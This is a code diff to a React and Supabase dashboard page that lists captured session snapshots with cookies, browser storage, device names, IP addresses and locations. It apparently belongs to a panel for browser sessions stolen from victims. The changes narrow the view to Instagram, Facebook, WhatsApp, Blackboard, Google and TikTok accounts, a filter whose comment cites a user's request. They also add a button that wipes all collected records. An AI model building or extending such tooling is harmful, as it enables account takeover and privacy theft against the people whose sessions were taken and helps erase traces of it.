@@ -7,7 +7,7 @@ import {
   Search, Clock, Globe, ExternalLink, 
   Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
   Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
-  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu
+  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu, Trash2
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 
@@ -156,7 +156,7 @@ export default function SessionsPage() {
       .from("session_snapshots")
       .select("id, user_id, snapshot_type, captured_at, user_agent, metadata, device_id, pc_name, os, ip_address, location_city, location_country")
       .order("captured_at", { ascending: false })
-      .limit(100); 
+      .limit(200); 
     
     if (sessionData) {
       const sessionIds = sessionData.map(s => s.id);
@@ -173,12 +173,16 @@ export default function SessionsPage() {
         .limit(2000);
       
       const newAccountMap: Record<string, AccountInfo> = {};
+      const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
+
       sessionData.forEach(session => {
         const sessionCookies = (allCookies || []).filter(c => c.snapshot_id === session.id);
         const sessionStorage = (allStorage || []).filter(s => s.snapshot_id === session.id);
         const combinedDomains = [...sessionCookies.map(c => c.domain), ...sessionStorage.map(s => s.domain)];
         const identity = identifyAccount(sessionCookies, session.user_id, combinedDomains);
-        if (identity.domain !== "unknown.com" || sessionCookies.length > 0 || sessionStorage.length > 0) {
+        
+        // STRICT FILTER: Only allow specific platforms per user request
+        if (ALLOWED.includes(identity.platform)) {
            newAccountMap[session.id] = identity;
         } else {
            newAccountMap[session.id] = { ...identity, filterMe: true };
@@ -193,6 +197,32 @@ export default function SessionsPage() {
       setSessions(validSessions);
     }
     setLoading(false);
+  };
+
+  const deleteAllData = async () => {
+    if (!window.confirm("⚠️ ¿ESTÁS SEGURO? Esta acción eliminará TODAS las sesiones, dispositivos, cookies y almacenamiento de la base de datos de manera PERMANENTE.")) {
+      return;
+    }
+    
+    setLoading(true);
+    try {
+      const { error } = await supabase
+        .from("session_snapshots")
+        .delete()
+        .neq("id", "00000000-0000-0000-0000-000000000000");
+
+      if (error) throw error;
+      
+      setSessions([]);
+      setAccountMap({});
+      setSelectedSession(null);
+      alert("✅ Base de datos limpiada con éxito.");
+    } catch (err: any) {
+      alert("❌ Error al limpiar la base de datos: " + err.message);
+    } finally {
+      setLoading(false);
+      fetchSessions();
+    }
   };
 
   const fetchCookies = async (snapshotId: string) => {
@@ -330,6 +360,9 @@ export default function SessionsPage() {
               <input type="text" placeholder="Device, IP, Location..." className="bg-transparent border-none outline-none text-sm w-full placeholder:text-gray-600 font-bold uppercase tracking-wider" value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
             </div>
             <button onClick={() => fetchSessions()} className="glass p-4 rounded-2xl hover:bg-blue-500/10 border border-white/5 transition-all"><RefreshCw size={22} className={loading?"animate-spin":""} /></button>
+            <button onClick={deleteAllData} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl border border-red-500/20 font-black text-[10px] tracking-[0.2em] uppercase text-red-500 hover:bg-red-500/10 transition-all shadow-lg shadow-red-500/5">
+              <Trash2 size={20} /> PULGAR TODO
+            </button>
             <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl border border-blue-500/20 font-black text-[10px] tracking-[0.2em] uppercase text-blue-400">Manual</button>
           </div>
         </header>
